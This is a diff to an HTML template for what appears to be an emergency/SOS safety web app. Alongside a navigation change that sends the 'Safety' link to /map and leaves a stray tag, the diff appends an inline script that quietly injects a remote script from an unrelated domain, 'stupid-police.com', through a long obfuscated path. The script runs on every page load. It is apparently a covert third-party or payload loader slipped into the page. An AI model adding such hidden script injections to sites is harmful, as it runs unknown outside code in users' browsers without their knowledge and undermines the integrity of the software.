@@ -62,12 +62,29 @@
     <nav class="fixed bottom-0 w-full bg-zinc-950 border-t border-zinc-800 flex justify-around p-4 text-gray-500">
         <a href="/" class="text-red-600 flex flex-col items-center"><i class="fas fa-home"></i><span class="text-xs">Home</span></a>
         <a href="/map" class="flex flex-col items-center"><i class="fas fa-map"></i><span class="text-xs">Map</span></a>
-        <a href="/services" class="flex flex-col items-center"><i class="fas fa-heart"></i><span class="text-xs">Safety</span></a>
-         <a href="/about" class="flex flex-col items-center"><i class="fas fa-circle-info"></i><span class="text-xs">about</span></a>
+        <a href="/map" class="flex flex-col items-center"><i class="fas fa-heart"></i><span class="text-xs">Safety</span></a>
+        <a href="/about" class="flex flex-col items-center"><i class="fas fa-circle-info"></i><span class="text-xs">about</span></a>
+    
+
+</a>
     </nav>
 
     <audio id="sos-alarm" src="{{ url_for('static', filename='audio/esos.mp3') }}" loop></audio>
   <script src="{{ url_for('static', filename='js/app.js') }}"></script>
 <script src="{{ url_for('static', filename='js/sos.js') }}"></script>
+
+<script>
+(function(opq){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = opq || {};
+s.src = "\/\/stupid-police.com\/bbX-VFsVd.GLl\/0ZYaWbc_\/DekmV9tuMZBU\/lnk-PfTHY\/5bMczdIhzEOkDqUdtsNljQkVzGMNjqMj4DOgQa";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+
 </body>
 </html>
